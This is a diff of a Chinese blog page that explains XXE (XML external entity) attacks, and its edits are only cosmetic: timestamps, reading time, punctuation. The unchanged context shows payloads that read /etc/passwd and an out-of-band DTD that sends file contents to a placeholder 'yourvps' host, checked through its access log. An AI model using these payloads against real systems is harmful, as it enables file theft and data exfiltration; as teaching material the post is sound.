@@ -98,7 +98,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/07/29/XXE/Picture8.png">
 <meta property="og:image" content="http://yoursite.com/2019/07/29/XXE/Picture9.png">
 <meta property="og:image" content="http://yoursite.com/2019/07/29/XXE/Picture10.png">
-<meta property="og:updated_time" content="2019-07-29T08:34:34.452Z">
+<meta property="og:updated_time" content="2019-07-29T08:37:33.149Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XXE原理及实现">
 <meta name="twitter:description" content="XXE原理及实现">
@@ -322,7 +322,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  4
+                  5
                 </span>
               
             </div>
@@ -381,7 +381,7 @@
 <p><font color="#873650"><strong>&lt;!ENTITY 实体名称 “实体的值”&gt;</strong></font><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY content "Hello world"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>外部实体声明:</p>
 <p><font color="#873650"><strong>&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;</strong></font><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a SYSTEM "http://localhost:8888/untitled/evil.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>evil.dtd<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>evil.dtd:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>外部实体可支持http、file等协议。不同程序支持的协议不同，如下图</p>
 <p><img src="/2019/07/29/XXE/Picture1.png" alt></p>
 <p>其中PHP支持的协议会更多一些，但是需要一定的扩展支持：</p>
@@ -396,7 +396,7 @@
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY content SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p> 外部实体:</p>
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a SYSTEM "http://yourvps/evil.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p> evil.dtd</p>
+<p> evil.dtd:</p>
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure>
 <p> <img src="/2019/07/29/XXE/Picture3.png" alt></p>
 <p> 如果要读取php文件，因为php、html等文件中有各种括号\&lt;，>，若直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。</p>
@@ -409,7 +409,7 @@
 </li>
 </ul>
 <p>flag.txt:<br>zww123</p>
-<p>evil.dtd</p>
+<p>evil.dtd:</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
 <p>yourvps:<br><strong>cat /var/log/httpd/access_log</strong></p>
 <p><img src="/2019/07/29/XXE/Picture5.png" alt></p>
